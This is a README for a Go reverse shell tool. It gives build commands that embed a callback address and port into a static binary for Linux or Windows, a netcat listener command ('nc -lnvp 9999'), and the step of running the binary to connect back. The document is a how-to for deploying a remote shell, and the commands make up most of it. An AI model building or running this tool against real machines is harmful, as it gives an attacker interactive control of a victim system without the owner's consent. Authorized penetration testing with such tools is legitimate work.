# go-reverse-shell

A cross-platform reverse shell written in Go.

## Usage

List supported platforms.

~~~ sh
go tool dist list
~~~

Compile static binary.

~~~ sh
./build.sh GOARCH=arm GOOS=linux TARGET=192.168.0.128:9999
./build.sh GOARCH=amd64 GOOS=windows TARGET=10.10.10.42:9999
~~~

Start listener.

~~~ sh
nc -lnvp 9999
~~~

Connect back.

~~~ sh
./shell.bin
~~~
